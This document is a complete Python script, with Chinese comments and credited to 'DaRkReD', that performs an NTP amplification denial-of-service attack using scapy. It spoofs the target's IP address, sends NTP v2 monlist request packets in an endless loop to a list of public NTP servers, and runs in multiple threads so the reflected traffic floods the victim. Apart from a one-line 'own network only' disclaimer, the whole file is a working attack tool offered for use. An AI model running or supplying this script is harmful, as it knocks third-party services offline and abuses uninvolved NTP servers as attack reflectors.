#!/usr/bin/env python3
from scapy.all import *
import sys
import threading
import time
import random  # 随机源端口

# NTP Amp DOS 攻击
# 作者：DaRkReD
# 用法 ntpdos.py <目标 IP> <ntpserver 列表> <线程数>
# 例：ntpdos.py 1.2.3.4 file.txt 10
# 仅供您自己的网络使用
# 随机源端口由 JDMoore0883 添加

# 数据包发送者
def deny():
    global ntplist, currentserver, data, target
    # 获取新服务器
    ntpserver = ntplist[currentserver]
    currentserver = (currentserver + 1) % len(ntplist)  # 循环使用服务器列表
    packet = IP(dst=ntpserver, src=target) / UDP(sport=random.randint(2000, 65535), dport=123) / Raw(load=data)
    send(packet, loop=1)  # 发送

# 帮助信息
def printhelp():
    print("NTP Amplification DOS Attack")
    print("By DaRkReD")
    print("Usage: ntpdos.py <target ip> <ntpserver list> <number of threads>")
    print("Example: ntpdos.py 1.2.3.4 file.txt 10")
    print("NTP serverlist file should contain one IP per line")
    print("MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS")
    exit(0)

try:
    if len(sys.argv) < 4:
        printhelp()

    # 获取参数
    target = sys.argv[1]

    # 帮助白痴
    if target.lower() in ("help", "-h", "h", "?", "--h", "--help", "/?"):
        printhelp()

    ntpserverfile = sys.argv[2]
    numberthreads = int(sys.argv[3])

    # 接受批量输入的系统
    ntplist = []
    currentserver = 0
    with open(ntpserverfile) as f:
        ntplist = [line.strip() for line in f]

    # 确保我们不出界
    if numberthreads > len(ntplist):
        print("Attack Aborted: More threads than servers")
        print("Next time don't create more threads than servers")
        exit(0)

    # 魔术数据包又名 NTP v2 单列表数据包
    data = b"\x17\x00\x03\x2a" + b"\x00" * 4

    # 抓住我们的线程
    threads = []
    print(f"Starting to flood: {target} using NTP list: {ntpserverfile} With {numberthreads} threads")
    print("Use CTRL+C to stop attack")

    # 线程生成器
    for _ in range(numberthreads):
        thread = threading.Thread(target=deny)
        thread.daemon = True
        thread.start()
        threads.append(thread)

    # 进行中!
    print("Sending...")
    # 保持活力，因此 ctrl+c 仍可杀死所有线程
    while True:
        time.sleep(1)

except KeyboardInterrupt:
    print("Script Stopped [ctrl + c]... Shutting down")